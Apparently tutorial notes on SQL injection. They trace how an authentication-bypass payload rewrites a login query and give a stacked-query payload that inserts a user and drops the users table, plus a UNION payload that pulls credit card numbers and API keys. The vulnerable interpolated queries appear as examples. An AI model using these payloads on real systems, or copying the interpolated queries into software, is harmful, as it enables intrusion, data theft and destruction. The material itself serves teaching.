SELECT id, username, is_admin, email FROM users WHERE username = '${username}' AND password = '${password}'



admin' OR '1'='1


SELECT id, username, is_admin, email FROM users WHERE username = 'admin' OR '1'='1' AND password = 'XYZ'


SELECT id, username, is_admin, email FROM users WHERE (username = 'admin') OR ('1'='1' AND password = 'XYZ')


SELECT id, username, is_admin, email FROM users WHERE (username = 'admin') OR (true AND false)

SELECT id, username, is_admin, email FROM users WHERE (username = 'admin') OR false

SELECT id, username, is_admin, email FROM users WHERE (username = 'admin') 






<!-- Query Stacking Attack -->

INSERT INTO users (id, username, password, email, is_admin) VALUES (124, 'bob', 'xyz', 'attacker@blog.com', 0); 
DROP TABLE users; 
--', 0)


<!-- Data Exfilteration / UNION Attacks -->

admin' UNION SELECT credit_card, api_key FROM users WHERE '1'='1


SELECT username, email FROM users WHERE username = '${username}'


SELECT username, email FROM users WHERE username = 'admin' 
UNION 
SELECT credit_card, api_key FROM users WHERE '1'='1'